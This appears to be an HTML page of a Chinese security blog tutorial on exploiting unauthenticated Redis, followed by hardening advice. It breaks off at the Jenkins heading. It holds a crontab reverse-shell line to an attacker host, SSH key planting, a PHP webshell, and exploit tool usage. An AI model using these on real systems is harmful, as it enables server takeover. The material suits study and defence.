@@ -1,0 +1,2053 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Unauthorized-Attack - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总. 0x00 小二上酒 https://github.com/se55i0n/DBScanner a)Redis未" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/unauthorized-attack/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Unauthorized-Attack" />
+<meta property="og:description" content="知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总. 0x00 小二上酒 https://github.com/se55i0n/DBScanner a)Redis未" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/unauthorized-attack/" />
+<meta property="article:published_time" content="2018-02-14T23:27:11&#43;00:00"/>
+<meta property="article:modified_time" content="2018-02-14T23:27:11&#43;00:00"/>
+
+<meta itemprop="name" content="Unauthorized-Attack">
+<meta itemprop="description" content="知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总. 0x00 小二上酒 https://github.com/se55i0n/DBScanner a)Redis未">
+
+
+<meta itemprop="datePublished" content="2018-02-14T23:27:11&#43;00:00" />
+<meta itemprop="dateModified" content="2018-02-14T23:27:11&#43;00:00" />
+<meta itemprop="wordCount" content="10466">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Unauthorized-Attack"/>
+<meta name="twitter:description" content="知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总. 0x00 小二上酒 https://github.com/se55i0n/DBScanner a)Redis未"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Unauthorized-Attack</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-小二上酒">0x00 小二上酒</a></li>
+<li><a href="#0x01-redis未授权访问">0x01 Redis未授权访问</a>
+<ul>
+<li><a href="#1-扫描探测"><strong>1.扫描探测</strong></a></li>
+<li><a href="#2-攻击的几种方法"><strong>2.攻击的几种方法</strong></a></li>
+<li><a href="#3-防护措施"><strong>3.防护措施</strong></a></li>
+</ul></li>
+<li><a href="#0x02-jenkins未授权访问">0x02 Jenkins未授权访问</a>
+<ul>
+<li><a href="#1-扫描探测-1"><strong>1.扫描探测</strong></a></li>
+<li><a href="#2-攻击利用"><strong>2.攻击利用</strong></a></li>
+<li><a href="#3-模拟低权限"><strong>3.模拟低权限</strong></a></li>
+<li><a href="#4-防护措施"><strong>4.防护措施</strong></a></li>
+</ul></li>
+<li><a href="#0x03-mongodb未授权访问">0x03 MongoDB未授权访问</a>
+<ul>
+<li><a href="#1-扫描探测-2"><strong>1.扫描探测</strong></a></li>
+<li><a href="#2-爆破脚本"><strong>2.爆破脚本</strong></a></li>
+<li><a href="#3-攻击脚本"><strong>3.攻击脚本</strong></a></li>
+<li><a href="#4-防范措施"><strong>4.防范措施</strong></a></li>
+</ul></li>
+<li><a href="#0x04-zookeeper未授权访问">0x04 ZooKeeper未授权访问</a>
+<ul>
+<li><a href="#1-扫描探测-3"><strong>1.扫描探测</strong></a></li>
+<li><a href="#2-攻击获取信息"><strong>2.攻击获取信息</strong></a></li>
+<li><a href="#3-防范措施"><strong>3.防范措施</strong></a></li>
+</ul></li>
+<li><a href="#0x05-elasticsearch未授权访问">0x05 Elasticsearch未授权访问</a>
+<ul>
+<li><a href="#1-熟悉的响应-you-know-for-search"><strong>1.熟悉的响应</strong> You Know, for Search</a></li>
+<li><a href="#2-漏洞测试"><strong>2.漏洞测试</strong></a></li>
+<li><a href="#3-漏洞修复"><strong>3.漏洞修复</strong></a></li>
+</ul></li>
+<li><a href="#0x06-memcache未授权访问">0x06 Memcache未授权访问</a>
+<ul>
+<li><a href="#1-扫描探测-4"><strong>1.扫描探测</strong></a></li>
+<li><a href="#2-攻击利用-1"><strong>2.攻击利用</strong></a></li>
+<li><a href="#3-防范措施-1"><strong>3.防范措施</strong></a></li>
+</ul></li>
+<li><a href="#0x07-hadoop未授权访问">0x07 Hadoop未授权访问</a>
+<ul>
+<li><a href="#1-扫描探测-5"><strong>1.扫描探测</strong></a></li>
+<li><a href="#2-攻击手法"><strong>2.攻击手法</strong></a></li>
+<li><a href="#3-防范措施-2"><strong>3.防范措施</strong></a></li>
+</ul></li>
+<li><a href="#0x08-couchdb未授权访问">0x08 CouchDB未授权访问</a>
+<ul>
+<li><a href="#1-扫描探测-6"><strong>1.扫描探测</strong></a></li>
+<li><a href="#2-两个版本的利用方式"><strong>2.两个版本的利用方式</strong></a></li>
+<li><a href="#3-漏洞修复-1"><strong>3.漏洞修复</strong></a></li>
+</ul></li>
+<li><a href="#0x09-docker未授权访问">0x09 Docker未授权访问</a>
+<ul>
+<li><a href="#1-基础介绍"><strong>1.基础介绍</strong></a></li>
+<li><a href="#2-测试环境配置"><strong>2.测试环境配置</strong></a></li>
+<li><a href="#3-漏洞复现"><strong>3.漏洞复现</strong></a></li>
+<li><a href="#4-防护策略"><strong>4.防护策略</strong></a></li>
+</ul></li>
+<li><a href="#0x10-未完待续">0x10 未完待续</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总.</p>
+
+<h1 id="0x00-小二上酒">0x00 小二上酒</h1>
+
+<p><a href="https://github.com/se55i0n/DBScanner">https://github.com/se55i0n/DBScanner</a></p>
+
+<blockquote>
+<p>a)Redis未授权访问<br />
+b)Jenkins未授权访问<br />
+c)MongoDB未授权访问<br />
+d)ZooKeeper未授权访问<br />
+e)Elasticsearch未授权访问<br />
+f)Memcache未授权访问<br />
+g)Hadoop未授权访问<br />
+h)CouchDB未授权访问<br />
+i)Docker未授权访问</p>
+</blockquote>
+
+<h1 id="0x01-redis未授权访问">0x01 Redis未授权访问</h1>
+
+<h2 id="1-扫描探测"><strong>1.扫描探测</strong></h2>
+
+<p><strong>(1). 测试时建议 vim /etc/redis.conf</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cp redis.conf ./src/redis.conf
+bind 127.0.0.1前面加上#号注释掉 或者更改成 0.0.0.0
+protected-mode设为no
+启动redis-server  ------&gt;   ./src/redis-server redis.conf</pre></td></tr></table>
+</div>
+</div>
+<p><strong>(2). 攻击者喜欢的命令</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">查看信息：info
+删除所有数据库内容：flushall
+刷新数据库：flushdb
+看所有键：KEYS *，使用select num可以查看键值数据。
+设置变量：set test &#34;who am i&#34;
+config set dir dirpath 设置路径等配置
+config get dir/dbfilename 获取路径及数据配置信息
+save保存
+get 变量，查看变量名称</pre></td></tr></table>
+</div>
+</div>
+<p><strong>(3). msf下利用模块</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">auxiliary/scanner/redis/file_upload
+auxiliary/scanner/redis/redis_login
+auxiliary/scanner/redis/redis_server</pre></td></tr></table>
+</div>
+</div>
+<p><strong>(4). nmap及获取信息</strong><br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-26_22-47-12.jpg" alt="" /><br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-26_22-49-50.jpg" alt="" /></p>
+
+<p>匿名扫描脚本:<a href="https://xz.aliyun.com/t/528">https://xz.aliyun.com/t/528</a></p>
+
+<h2 id="2-攻击的几种方法"><strong>2.攻击的几种方法</strong></h2>
+
+<p>参考:<br />
+<a href="http://www.cnblogs.com/xiaozi/p/7568272.html">http://www.cnblogs.com/xiaozi/p/7568272.html</a><br />
+<a href="https://evi1cg.me/archives/hackredis.html">https://evi1cg.me/archives/hackredis.html</a></p>
+
+<p><strong>(1).利用计划任务执行命令反弹shell</strong></p>
+
+<p>在redis以root权限运行时可以写crontab来执行命令反弹shell<br />
+ 先在自己的服务器上监听一个端口</p>
+
+<p><code>nc -lvnp 7999</code></p>
+
+<p>然后执行命令:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# redis-cli -h <span class="m">192</span>.168.63.130
+<span class="m">192</span>.168.63.130:6379&gt; <span class="nb">set</span> x <span class="s2">&#34;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&#34;</span>
+<span class="m">192</span>.168.63.130:6379&gt; config <span class="nb">set</span> dir /var/spool/cron/
+<span class="m">192</span>.168.63.130:6379&gt; config <span class="nb">set</span> dbfilename root
+<span class="m">192</span>.168.63.130:6379&gt; save</code></pre></td></tr></table>
+</div>
+</div>
+<p>ps:此处使用bash反弹shell，也可使用其他方法<br />
+<strong>(2).写ssh-keygen公钥然后使用私钥登陆</strong></p>
+
+<p>在以下条件下，可以利用此方法</p>
+
+<p>1、Redis服务使用ROOT账号启动</p>
+
+<p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。<br />
+    首先在本地生成一对密钥：<br />
+<code>root@kali:~/.ssh# ssh-keygen -t rsa</code></p>
+
+<p>然后redis执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa
+<span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; foo.txt
+cat foo.txt <span class="p">|</span> redis-cli -h x.x.x.x -x <span class="nb">set</span> crackit
+redis-cli -h x.x.x.x
+&gt; config <span class="nb">set</span> dir /root/.ssh/
+&gt; config get dir
+&gt; config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
+&gt; save
+
+ssh -i id_rsa root@x.x.x.x</code></pre></td></tr></table>
+</div>
+</div>
+<p>或者如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">192.168.63.130:6379&gt; config set dir /root/.ssh/
+192.168.63.130:6379&gt; config set dbfilename authorized_keys
+192.168.63.130:6379&gt; set x &#34;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&#34;
+
+192.168.63.130:6379&gt; save</pre></td></tr></table>
+</div>
+</div>
+<p><strong>(3).往web物理路径写webshell</strong></p>
+
+<p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">192.168.63.130:6379&gt; config set dir /var/www/html/
+192.168.63.130:6379&gt; config set dbfilename shell.php
+192.168.63.130:6379&gt; set x &#34;&lt;?php @eval($_POST[1]);?&gt;&#34;
+192.168.63.130:6379&gt; save</pre></td></tr></table>
+</div>
+</div>
+<p>即可将shell写入web目录(目录请根据实际情况决定)</p>
+
+<p><strong>(4).写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</strong></p>
+
+<p>From:<a href="http://www.00theway.org/2017/03/27/redis_exp/">http://www.00theway.org/2017/03/27/redis_exp/</a><br />
+写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">local</span> <span class="n">function</span> <span class="n">hex2bin</span><span class="p">(</span><span class="n">hexstr</span><span class="p">)</span>
+    <span class="n">local</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">string</span><span class="o">.</span><span class="nb">len</span><span class="p">(</span><span class="n">hexstr</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span> <span class="n">do</span>
+        <span class="n">local</span> <span class="n">doublebytestr</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">hexstr</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">local</span> <span class="n">n</span> <span class="o">=</span> <span class="n">tonumber</span><span class="p">(</span><span class="n">doublebytestr</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+        <span class="k">if</span> <span class="mi">0</span> <span class="o">==</span> <span class="n">n</span> <span class="n">then</span>
+            <span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span> <span class="o">..</span> <span class="s1">&#39;</span><span class="se">\00</span><span class="s1">&#39;</span>
+        <span class="k">else</span>
+            <span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span> <span class="o">..</span> <span class="n">string</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%c</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+        <span class="n">end</span>
+    <span class="n">end</span>
+    <span class="k">return</span> <span class="nb">str</span>
+<span class="n">end</span>
+
+<span class="n">local</span> <span class="nb">dir</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
+<span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;set&#39;</span><span class="p">,</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="s1">&#39;/tmp/&#39;</span><span class="p">)</span>
+<span class="n">local</span> <span class="n">dbfilename</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;dbfilename&#39;</span><span class="p">)</span>
+<span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;set&#39;</span><span class="p">,</span><span class="s1">&#39;dbfilename&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">)</span>
+<span class="n">local</span> <span class="n">rdbcompress</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;rdbcompression&#39;</span><span class="p">)</span>
+<span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;set&#39;</span><span class="p">,</span><span class="s1">&#39;rdbcompression&#39;</span><span class="p">,</span><span class="s1">&#39;no&#39;</span><span class="p">)</span>
+<span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;flushall&#39;</span><span class="p">)</span>
+
+<span class="n">local</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;1a2b3c4d5e6f1223344556677890aa&#39;</span>
+<span class="n">redis</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;set&#39;</span><span class="p">,</span><span class="s1">&#39;data&#39;</span><span class="p">,</span><span class="n">hex2bin</span><span class="p">(</span><span class="s1">&#39;0a7c7c7c&#39;</span><span class="o">..</span><span class="n">data</span><span class="o">..</span><span class="s1">&#39;7c7c7c0a&#39;</span><span class="p">))</span>
+<span class="n">local</span> <span class="n">rst</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">rst</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;server default config&#39;</span>
+<span class="n">rst</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dir:&#39;</span><span class="o">..</span><span class="nb">dir</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">rst</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dbfilename:&#39;</span><span class="o">..</span><span class="n">dbfilename</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">rst</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;rdbcompression:&#39;</span><span class="o">..</span><span class="n">rdbcompress</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="k">return</span> <span class="n">rst</span>
+<span class="err">保存以上代码为</span><span class="n">a</span><span class="o">.</span><span class="n">lua</span><span class="err">，变量</span><span class="n">data保存的是程序的16进制编码</span><span class="err">，执行</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><code>redis-cli --eval a.lua -h *.*.*.*</code><br />
+由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">redis-cli save -h *.*.*.*
+redis-cli config set dir *** -h *.*.*.*
+redis-cli config set dbfilename *** -h *.*.*.*
+redis-cli config set rdbcompression * -h *.*.*.*</pre></td></tr></table>
+</div>
+</div>
+<p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了<code>|||</code>作为提取最终文件的标识）。</p>
+
+<p><code>*/1 * * * * python -c 'open(&quot;/tmp/rst&quot;,&quot;a+&quot;).write(open(&quot;/tmp/t&quot;).read().split(&quot;|||&quot;)[1])'</code><br />
+/tmp/rst为最终上传的文件。</p>
+
+<p><strong>(5).自动化python脚本</strong><br />
+From:<a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">执行命令
+需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。
+    python redis_exp.py --host *.*.*.* -c &#39;id&#39;
+
+上传文件
+上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据
+    python redis_exp.py --host *.*.*.* -l /data/payload.py -r /tmp/p.py
+
+暴力猜解目录
+不需要root权限，利用 config set dir &#39;xx&#39; 报错进行目录猜解
+    python redis_exp.py --host *.*.*.* -f p.txt
+
+可以通过-p参数更改默认端口，-t参数更改等待时间</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/redis_fileupload.png" alt="" /><br />
+<img src="https://img.04z.net/img/redis_command.png" alt="" /></p>
+
+<p><strong>(6).批量验证</strong><br />
+From:<a href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p>
+
+<h2 id="3-防护措施"><strong>3.防护措施</strong></h2>
+
+<p><strong>1.禁止一些高危命令</strong></p>
+
+<p>修改 redis.conf 文件，添加以下内容，来禁用远程修改 DB 文件地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">rename-command FLUSHALL &#34;&#34;
+rename-command CONFIG   &#34;&#34;
+rename-command EVAL     &#34;&#34;</pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.以低权限运行 Redis 服务</strong></p>
+
+<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br />
+    <code>$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</code><br />
+<strong>3.为 Redis 添加密码验证</strong></p>
+
+<p>修改 redis.conf 文件，添加<br />
+     <code>requirepass mypassword</code><br />
+<strong>4.禁止外网访问 Redis</strong></p>
+
+<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br />
+     <code>bind 127.0.0.1</code><br />
+<strong>5.保证 authorized_keys 文件的安全</strong></p>
+
+<p>为了保证安全，您应该阻止其他用户添加新的公钥。<br />
+ 将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br />
+     <code># chmod 400 ~/.ssh/authorized_keys</code></p>
+
+<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br />
+     <code># chattr +i ~/.ssh/authorized_keys</code></p>
+
+<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br />
+     <code># chattr +i ~/.ssh</code></p>
+
+<p>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。<br />
+<strong>6.修改默认端口</strong></p>
+
+<p>指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字<br />
+    <code># redis-server --port 6380</code></p>
+
+<p><strong>7.防火墙</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">// accept
+<span class="c1"># iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span>
+<span class="c1"># iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span>
+
+// drop
+<span class="c1"># iptables -I INPUT -p tcp --dport 6379 -j DROP</span>
+<span class="c1"># iptables -I INPUT -p udp --dport 6379 -j DROP</span>
+
+// 保存规则并重启 iptables
+<span class="c1"># service iptables save</span>
+<span class="c1"># service iptables restart</span></code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x02-jenkins未授权访问">0x02 Jenkins未授权访问</h1>
+
+<h2 id="1-扫描探测-1"><strong>1.扫描探测</strong></h2>
+
